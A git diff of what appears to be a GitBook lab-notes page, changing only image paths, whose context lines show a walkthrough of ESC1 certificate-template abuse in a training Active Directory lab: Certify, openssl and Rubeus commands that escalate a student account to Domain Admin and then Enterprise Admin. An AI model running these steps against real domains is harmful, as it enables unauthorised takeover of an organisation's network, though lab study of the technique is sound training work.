@@ -38,7 +38,7 @@ C:\AD\Tools\Certify.exe cas
 
 We can list all the templates using the following command. Going through the output we can find some interesting templates:
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation to DA using ESC1
 
@@ -48,7 +48,7 @@ The template HTTPSCertificates looks interesting. Let’s get some more informat
 C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that studentx is a member of RDPUsers group. This means that we can request certificate for any user as studentx.
 
@@ -58,7 +58,7 @@ Let’s request a certificate for Domain Admin - Administrator:
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">Copy all the text between</mark> <mark style="background-color:yellow;">`-----BEGIN RSA PRIVATE KEY-----`</mark> <mark style="background-color:yellow;">and</mark> <mark style="background-color:yellow;">`-----END CERTIFICATE-----`</mark> <mark style="background-color:yellow;">and save it to esc1.pem. (INSIDE /AD/TOOL same)</mark>
 
@@ -140,7 +140,7 @@ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Mic
 
 > I will use `SecretPass@123` as the export password.
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use the PFX created above with Rubeus to request a TGT for DA - Administrator!
 
@@ -152,7 +152,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administr
 
 > It inject the ticket directly
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Check if we actually have DA privileges
 
@@ -160,11 +160,11 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administr
 winrs -r:dcorp-dc cmd /c set username
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation to EA using ESC1
 
@@ -247,7 +247,7 @@ Save the certificate to `esc1-EA.pem` and convert it to PFX. I will use `SecretP
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Use Rubeus to request TGT for Enterprise Administrator - Administrator - EA
 
